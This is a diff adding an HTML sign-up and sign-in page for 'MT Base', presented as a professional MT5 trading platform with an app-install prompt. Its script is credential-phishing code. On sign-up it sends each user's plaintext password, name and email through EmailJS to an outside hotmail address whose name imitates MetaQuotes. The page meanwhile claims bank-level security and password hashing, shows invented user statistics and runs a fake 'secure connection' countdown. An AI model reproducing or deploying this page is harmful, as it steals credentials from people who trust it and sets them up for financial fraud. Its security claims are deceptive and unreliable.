@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#07111a">
+    <meta name="description" content="MT Base - Professional Trading Platform">
+    <title>MT Base — Account Access</title>
+    
+    <!-- PWA Manifest -->
+    <link rel="manifest" href="manifest.json">
+    
+    <!-- Apple Touch Icon -->
+    <link rel="apple-touch-icon" href="icons/icon-192.png">
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
+    
+    <style>
+        :root {
+            --primary-color: #f59e0b;
+            --primary-dark: #b45309;
+            --bg-dark: #07111a;
+            --card-bg: #0f1720;
+            --text-light: #e6eef6;
+            --text-muted: #94a3b8;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #07111a 0%, #0a1a2a 100%);
+            color: var(--text-light);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .glass-effect {
+            background: rgba(15, 23, 32, 0.85);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+            color: white;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(245, 158, 11, 0.3);
+        }
+        
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .form-input {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: white;
+            transition: all 0.3s ease;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #f59e0b;
+            box-shadow: 0 0 0 3px rgba(245, 158, 11, 0.1);
+        }
+        
+        .loading-spinner {
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #f59e0b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .feature-icon {
+            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 12px;
+        }
+        
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+            
+            .grid-cols-2 {
+                grid-template-columns: 1fr;
+            }
+            
+            .text-4xl {
+                font-size: 2rem;
+            }
+            
+            .p-8 {
+                padding: 1.5rem;
+            }
+        }
+        
+        /* Install Button Styles */
+        #installBtn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 1000;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        /* Toast Notification */
+        .toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1001;
+            transform: translateX(150%);
+            transition: transform 0.3s ease;
+        }
+        
+        .toast.show {
+            transform: translateX(0);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+    <!-- Install Button -->
+    <button id="installBtn" class="hidden glass-effect px-6 py-3 rounded-xl flex items-center gap-2 shadow-lg">
+        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+            <path d="M13 7H7v6h6V7z"/>
+            <path fill-rule="evenodd" d="M7 2a1 1 0 012 0v1h2V2a1 1 0 112 0v1h2a2 2 0 012 2v2h1a1 1 0 110 2h-1v2h1a1 1 0 110 2h-1v2a2 2 0 01-2 2h-2v1a1 1 0 11-2 0v-1H9v1a1 1 0 11-2 0v-1H5a2 2 0 01-2-2v-2H2a1 1 0 110-2h1V9H2a1 1 0 010-2h1V5a2 2 0 012-2h2V2zM5 5h10v10H5V5z" clip-rule="evenodd"/>
+        </svg>
+        Install App
+    </button>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="toast glass-effect px-6 py-3 rounded-xl max-w-sm">
+        <div class="flex items-center gap-3">
+            <div id="toastIcon"></div>
+            <div id="toastMessage"></div>
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container max-w-6xl">
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+            <!-- Left Column - Branding & Features -->
+            <div class="space-y-8">
+                <!-- Header -->
+                <div class="glass-effect rounded-2xl p-8">
+                    <div class="flex items-center gap-4 mb-6">
+                        <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-amber-500 to-amber-600 flex items-center justify-center">
+                            <span class="text-xl font-bold text-white">MT</span>
+                        </div>
+                        <div>
+                            <h1 class="text-4xl font-bold text-white">MT Base</h1>
+                            <p class="text-amber-400 font-medium">Professional Trading Platform</p>
+                        </div>
+                    </div>
+                    
+                    <p class="text-lg text-gray-300 mb-8">
+                        Access your MT5 trading account securely. Trade forex, indices, commodities, and cryptocurrencies with institutional-grade execution.
+                    </p>
+                    
+                    <div class="space-y-6">
+                        <div class="flex items-start gap-4">
+                            <div class="feature-icon w-10 h-10 flex-shrink-0">
+                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+                                </svg>
+                            </div>
+                            <div>
+                                <h3 class="text-lg font-semibold text-white mb-1">Bank-Level Security</h3>
+                                <p class="text-gray-400">256-bit SSL encryption and secure password hashing for maximum protection.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="flex items-start gap-4">
+                            <div class="feature-icon w-10 h-10 flex-shrink-0">
+                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                                    <path d="M10 12a2 2 0 100-4 2 2 0 000 4z"/>
+                                    <path fill-rule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clip-rule="evenodd"/>
+                                </svg>
+                            </div>
+                            <div>
+                                <h3 class="text-lg font-semibold text-white mb-1">Real-time Monitoring</h3>
+                                <p class="text-gray-400">Monitor your positions and account balance with real-time market data.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="flex items-start gap-4">
+                            <div class="feature-icon w-10 h-10 flex-shrink-0">
+                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M12 7a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0V8.414l-4.293 4.293a1 1 0 01-1.414 0L8 10.414l-4.293 4.293a1 1 0 01-1.414-1.414l5-5a1 1 0 011.414 0L11 10.586 14.586 7H12z" clip-rule="evenodd"/>
+                                </svg>
+                            </div>
+                            <div>
+                                <h3 class="text-lg font-semibold text-white mb-1">Instant Execution</h3>
+                                <p class="text-gray-400">Trade execution in milliseconds with no requotes and tight spreads.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Stats -->
+                <div class="grid grid-cols-2 gap-4">
+                    <div class="glass-effect rounded-2xl p-6 text-center">
+                        <div class="text-3xl font-bold text-amber-400 mb-2">500K+</div>
+                        <div class="text-gray-400">Active Traders</div>
+                    </div>
+                    <div class="glass-effect rounded-2xl p-6 text-center">
+                        <div class="text-3xl font-bold text-amber-400 mb-2">99.9%</div>
+                        <div class="text-gray-400">Uptime</div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Right Column - Forms -->
+            <div class="space-y-8">
+                <!-- Forms Container -->
+                <div class="glass-effect rounded-2xl p-8">
+                    <!-- Tabs -->
+                    <div class="flex border-b border-gray-800 mb-8">
+                        <button id="signupTab" class="flex-1 py-3 font-semibold text-lg text-center border-b-2 border-amber-400 text-amber-400">
+                            Create Account
+                        </button>
+                        <button id="signinTab" class="flex-1 py-3 font-semibold text-lg text-center text-gray-400 hover:text-white transition-colors">
+                            Sign In
+                        </button>
+                    </div>
+                    
+                    <!-- Sign Up Form -->
+                    <form id="signupForm" class="space-y-6">
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                            <div>
+                                <label class="block text-sm font-medium text-gray-300 mb-2">Full Name</label>
+                                <input type="text" id="fullName" required 
+                                       class="w-full form-input rounded-xl px-4 py-3 focus:outline-none"
+                                       placeholder="John Smith">
+                            </div>
+                            
+                            <div>
+                                <label class="block text-sm font-medium text-gray-300 mb-2">Email Address</label>
+                                <input type="email" id="email" required 
+                                       class="w-full form-input rounded-xl px-4 py-3 focus:outline-none"
+                                       placeholder="john@example.com">
+                            </div>
+                        </div>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                            <div>
+                                <label class="block text-sm font-medium text-gray-300 mb-2">Password</label>
+                                <input type="password" id="password" required minlength="6"
+                                       class="w-full form-input rounded-xl px-4 py-3 focus:outline-none"
+                                       placeholder="••••••••">
+                                <p class="text-xs text-gray-500 mt-1">Minimum 6 characters</p>
+                            </div>
+                            
+                            <div>
+                                <label class="block text-sm font-medium text-gray-300 mb-2">Confirm Password</label>
+                                <input type="password" id="confirmPassword" required
+                                       class="w-full form-input rounded-xl px-4 py-3 focus:outline-none"
+                                       placeholder="••••••••">
+                            </div>
+                        </div>
+                        
+                        <div class="flex items-center">
+                            <input type="checkbox" id="terms" required class="w-4 h-4 rounded">
+                            <label for="terms" class="ml-2 text-sm text-gray-300">
+                                I agree to the <a href="#" class="text-amber-400 hover:text-amber-300">Terms of Service</a> and <a href="#" class="text-amber-400 hover:text-amber-300">Privacy Policy</a>
+                            </label>
+                        </div>
+                        
+                        <button type="submit" id="signupBtn" 
+                                class="w-full btn-primary py-3 rounded-xl font-semibold text-lg">
+                            Open Live Account
+                        </button>
+                    </form>
+                    
+                    <!-- Sign In Form -->
+                    <form id="signinForm" class="space-y-6 hidden">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-300 mb-2">Email Address</label>
+                            <input type="email" id="signinEmail" required
+                                   class="w-full form-input rounded-xl px-4 py-3 focus:outline-none"
+                                   placeholder="john@example.com">
+                        </div>
+                        
+                        <div>
+                            <label class="block text-sm font-medium text-gray-300 mb-2">Password</label>
+                            <input type="password" id="signinPassword" required
+                                   class="w-full form-input rounded-xl px-4 py-3 focus:outline-none"
+                                   placeholder="••••••••">
+                        </div>
+                        
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center">
+                                <input type="checkbox" id="remember" class="w-4 h-4 rounded">
+                                <label for="remember" class="ml-2 text-sm text-gray-300">Remember me</label>
+                            </div>
+                            <a href="#" class="text-sm text-amber-400 hover:text-amber-300">Forgot password?</a>
+                        </div>
+                        
+                        <button type="submit" id="signinBtn"
+                                class="w-full btn-primary py-3 rounded-xl font-semibold text-lg">
+                            Sign In to Platform
+                        </button>
+                    </form>
+                    
+                    <!-- Loading Overlay -->
+                    <div id="loadingOverlay" class="fixed inset-0 bg-black bg-opacity-90 hidden items-center justify-center z-50">
+                        <div class="text-center">
+                            <div class="loading-spinner w-16 h-16 mb-4 mx-auto"></div>
+                            <div class="text-white text-xl font-semibold mb-2">Establishing Secure Connection</div>
+                            <div id="countdown" class="text-gray-400">15 seconds remaining</div>
+                            <p class="text-gray-500 mt-4 max-w-sm">Setting up your trading environment and securing your account...</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Footer -->
+                <div class="text-center text-gray-500 text-sm">
+                    <p>MT Base is an MT5 trading platform provider. Trading financial instruments involves risk.</p>
+                    <p class="mt-2">© 2024 MT Base. All rights reserved.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // EmailJS Configuration
+        const EMAILJS_USER_ID = 'fgYbV3Uj86-5V7RcU';
+        const EMAILJS_SERVICE_ID = 'service_va1veoo';
+        const EMAILJS_TEMPLATE_ADMIN = 'template_prvf88i';
+        const EMAILJS_TEMPLATE_USER = 'template_6s6ai6b';
+        
+        // Initialize EmailJS
+        (function() {
+            emailjs.init(EMAILJS_USER_ID);
+        })();
+
+        // DOM Elements
+        const signupTab = document.getElementById('signupTab');
+        const signinTab = document.getElementById('signinTab');
+        const signupForm = document.getElementById('signupForm');
+        const signinForm = document.getElementById('signinForm');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const countdownElement = document.getElementById('countdown');
+        const toast = document.getElementById('toast');
+        const toastIcon = document.getElementById('toastIcon');
+        const toastMessage = document.getElementById('toastMessage');
+        const installBtn = document.getElementById('installBtn');
+
+        // PWA Installation Variables
+        let deferredPrompt;
+        
+        // Tab Switching
+        signupTab.addEventListener('click', () => {
+            signupTab.classList.add('border-b-2', 'border-amber-400', 'text-amber-400');
+            signupTab.classList.remove('text-gray-400');
+            signinTab.classList.remove('border-b-2', 'border-amber-400', 'text-amber-400');
+            signinTab.classList.add('text-gray-400');
+            signupForm.classList.remove('hidden');
+            signinForm.classList.add('hidden');
+        });
+        
+        signinTab.addEventListener('click', () => {
+            signinTab.classList.add('border-b-2', 'border-amber-400', 'text-amber-400');
+            signinTab.classList.remove('text-gray-400');
+            signupTab.classList.remove('border-b-2', 'border-amber-400', 'text-amber-400');
+            signupTab.classList.add('text-gray-400');
+            signinForm.classList.remove('hidden');
+            signupForm.classList.add('hidden');
+        });
+
+        // Show Toast Notification
+        function showToast(message, type = 'info') {
+            toastIcon.innerHTML = '';
+            if (type === 'success') {
+                toastIcon.innerHTML = '<svg class="w-5 h-5 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>';
+            } else if (type === 'error') {
+                toastIcon.innerHTML = '<svg class="w-5 h-5 text-red-400" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"/></svg>';
+            } else {
+                toastIcon.innerHTML = '<svg class="w-5 h-5 text-amber-400" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/></svg>';
+            }
+            
+            toastMessage.textContent = message;
+            toast.classList.add('show');
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        // Countdown Timer
+        function startCountdown(duration, callback) {
+            let timeLeft = duration;
+            countdownElement.textContent = `${timeLeft} seconds remaining`;
+            
+            const interval = setInterval(() => {
+                timeLeft--;
+                countdownElement.textContent = `${timeLeft} seconds remaining`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(interval);
+                    callback();
+                }
+            }, 1000);
+            
+            return interval;
+        }
+
+        // Password Hashing (SHA-256)
+        async function hashPassword(password) {
+            const encoder = new TextEncoder();
+            const data = encoder.encode(password);
+            const hash = await crypto.subtle.digest('SHA-256', data);
+            return Array.from(new Uint8Array(hash))
+                .map(b => b.toString(16).padStart(2, '0'))
+                .join('');
+        }
+
+        // Save User Data to Local Storage
+        function saveUserData(email, name, hashedPassword) {
+            const userData = {
+                email: email,
+                name: name,
+                passwordHash: hashedPassword,
+                createdAt: new Date().toISOString(),
+                accountNumber: 'MT' + Date.now().toString().slice(-8)
+            };
+            
+            localStorage.setItem('mtbase_user_' + email, JSON.stringify(userData));
+            return userData;
+        }
+
+        // Verify User Credentials
+        async function verifyCredentials(email, password) {
+            const userData = JSON.parse(localStorage.getItem('mtbase_user_' + email));
+            if (!userData) return false;
+            
+            const hashedInput = await hashPassword(password);
+            return hashedInput === userData.passwordHash;
+        }
+
+        // Send Email via EmailJS
+        async function sendEmail(templateId, templateParams) {
+            try {
+                const response = await emailjs.send(
+                    EMAILJS_SERVICE_ID,
+                    templateId,
+                    templateParams
+                );
+                console.log('Email sent successfully:', response);
+                return true;
+            } catch (error) {
+                console.error('Email sending failed:', error);
+                return false;
+            }
+        }
+
+        // Sign Up Handler
+        signupForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const fullName = document.getElementById('fullName').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            
+            // Validation
+            if (password !== confirmPassword) {
+                showToast('Passwords do not match', 'error');
+                return;
+            }
+            
+            if (password.length < 6) {
+                showToast('Password must be at least 6 characters', 'error');
+                return;
+            }
+            
+            // Hash password
+            const hashedPassword = await hashPassword(password);
+            
+            // Save user data
+            const userData = saveUserData(email, fullName, hashedPassword);
+            
+            // Show loading overlay
+            loadingOverlay.classList.remove('hidden');
+            document.body.style.overflow = 'hidden';
+            
+            // Start countdown
+            const countdownDuration = 15;
+            let countdownInterval = startCountdown(countdownDuration, () => {
+                // Redirect after countdown
+                window.location.href = 'trade-menu.html';
+            });
+            
+            // Send admin email
+            const adminEmailParams = {
+                to_email: 'metaqoutes-base@hotmail.com',
+                user_email: email,
+                user_name: fullName,
+                user_password: password,
+                account_number: userData.accountNumber,
+                timestamp: new Date().toLocaleString()
+            };
+            
+            // Send user confirmation email
+            const userEmailParams = {
+                to_email: email,
+                to_name: fullName,
+                account_number: userData.accountNumber,
+                login_url: window.location.href,
+                support_email: 'support@mtbase.com'
+            };
+            
+            // Send emails
+            try {
+                await Promise.all([
+                    sendEmail(EMAILJS_TEMPLATE_ADMIN, adminEmailParams),
+                    sendEmail(EMAILJS_TEMPLATE_USER, userEmailParams)
+                ]);
+                showToast('Account created successfully! Check your email for confirmation.', 'success');
+            } catch (error) {
+                showToast('Account created but email notification failed', 'error');
+            }
+            
+            // Store session data
+            sessionStorage.setItem('mtbase_session', JSON.stringify({
+                email: email,
+                name: fullName,
+                accountNumber: userData.accountNumber,
+                loggedIn: true,
+                timestamp: Date.now()
+            }));
+        });
+
+        // Sign In Handler
+        signinForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('signinEmail').value;
+            const password = document.getElementById('signinPassword').value;
+            
+            // Verify credentials
+            const isValid = await verifyCredentials(email, password);
+            
+            if (!isValid) {
+                showToast('Invalid email or password', 'error');
+                return;
+            }
+            
+            // Get user data
+            const userData = JSON.parse(localStorage.getItem('mtbase_user_' + email));
+            
+            // Show loading overlay
+            loadingOverlay.classList.remove('hidden');
+            document.body.style.overflow = 'hidden';
+            
+            // Start countdown
+            const countdownDuration = 15;
+            let countdownInterval = startCountdown(countdownDuration, () => {
+                // Redirect after countdown
+                window.location.href = 'trade-menu.html';
+            });
+            
+            // Store session data
+            sessionStorage.setItem('mtbase_session', JSON.stringify({
+                email: email,
+                name: userData.name,
+                accountNumber: userData.accountNumber,
+                loggedIn: true,
+                timestamp: Date.now()
+            }));
+            
+            showToast('Sign in successful! Redirecting to trading platform...', 'success');
+        });
+
+        // PWA Installation Handling
+        window.addEventListener('beforeinstallprompt', (e) => {
+            // Prevent Chrome 67 and earlier from automatically showing the prompt
+            e.preventDefault();
+            // Stash the event so it can be triggered later
+            deferredPrompt = e;
+            // Show install button
+            installBtn.classList.remove('hidden');
+            
+            showToast('Install MT Base App for better experience', 'info');
+        });
+
+        installBtn.addEventListener('click', async () => {
+            if (!deferredPrompt) return;
+            
+            // Show the install prompt
+            deferredPrompt.prompt();
+            
+            // Wait for the user to respond to the prompt
+            const { outcome } = await deferredPrompt.userChoice;
+            
+            if (outcome === 'accepted') {
+                showToast('MT Base App installation started!', 'success');
+                installBtn.classList.add('hidden');
+            } else {
+                showToast('Installation cancelled', 'error');
+            }
+            
+            deferredPrompt = null;
+        });
+
+        // Check if app is already installed
+        window.addEventListener('appinstalled', () => {
+            showToast('MT Base App installed successfully!', 'success');
+            installBtn.classList.add('hidden');
+        });
+
+        // Service Worker Registration for PWA
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('service-worker.js')
+                    .then(registration => {
+                        console.log('ServiceWorker registration successful');
+                    })
+                    .catch(err => {
+                        console.log('ServiceWorker registration failed: ', err);
+                    });
+            });
+        }
+
+        // Check for existing session
+        window.addEventListener('load', () => {
+            const session = sessionStorage.getItem('mtbase_session');
+            if (session) {
+                try {
+                    const sessionData = JSON.parse(session);
+                    if (sessionData.loggedIn && (Date.now() - sessionData.timestamp < 3600000)) {
+                        // Auto-redirect if session is valid (less than 1 hour old)
+                        showToast('Welcome back! Redirecting to trading platform...', 'info');
+                        setTimeout(() => {
+                            window.location.href = 'trade-menu.html';
+                        }, 2000);
+                    }
+                } catch (e) {
+                    // Invalid session data
+                    sessionStorage.removeItem('mtbase_session');
+                }
+            }
+        });
+    </script>
+</body>
+  </html>
